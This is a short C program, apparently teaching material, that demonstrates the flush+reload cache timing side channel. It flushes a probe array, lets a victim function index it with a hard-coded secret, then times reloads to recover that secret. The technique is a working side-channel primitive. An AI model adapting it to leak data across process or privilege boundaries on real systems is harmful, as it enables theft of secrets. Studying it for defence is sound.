/*
 * flushreload.c
 * Use the flush+reload technique to determine secret value.
 *
 * Kyle Dotterrer
 * December, 2018 
 */

#include <stdio.h>
#include <emmintrin.h>
#include <x86intrin.h>

/* ----------------------------------------------------------------------------
	Constants
*/

// array access below cycles assumed to be cache hit  
#define CACHE_HIT_THRESHOLD (80)  

#define ARRSIZE (256)
#define DELTA   (1024)  // offset on each array access 

/* ----------------------------------------------------------------------------
	Global Variables 
*/

uint8_t array[ARRSIZE*4096];

// set the secret value here 
char secret = 94;
int temp;

/* ----------------------------------------------------------------------------
	Local Prototypes 
*/

void flush_side_channel  (void);
void reload_side_channel (void); 

void victim(void);

/* ----------------------------------------------------------------------------
	Main
*/

int main(void) {
	flush_side_channel();
	victim();
	reload_side_channel();

	exit(0); 
}

/* ----------------------------------------------------------------------------
	Local Functions 
*/

void flush_side_channel(void) {
	// write to array to bring it to RAM
	// prevents copy on write 
	for (int i = 0; i < ARRSIZE; i++) 
		array[i*4096 + DELTA] = 1;

	// flush the entire array from cache 
	for (int i = 0; i < ARRSIZE; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
	
}

void reload_side_channel(void) {
	// where we store register contents
	// dont care about this 
	unsigned int junk = 0;

	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (int i = 0; i < ARRSIZE; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr; 
		time2 = __rdtscp(&junk) - time1;

		// large variable latency of access time due to caching 
		// allows us to determine (with high degree of certainty)
		// what the secret value used to access the array was 
		if (time2 <= CACHE_HIT_THRESHOLD) {
			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
			printf("the secret = %d\n", i);
		}
	}
}

void victim(void) {
	// use secret to access the array 
	temp = array[secret*4096 + DELTA];
}
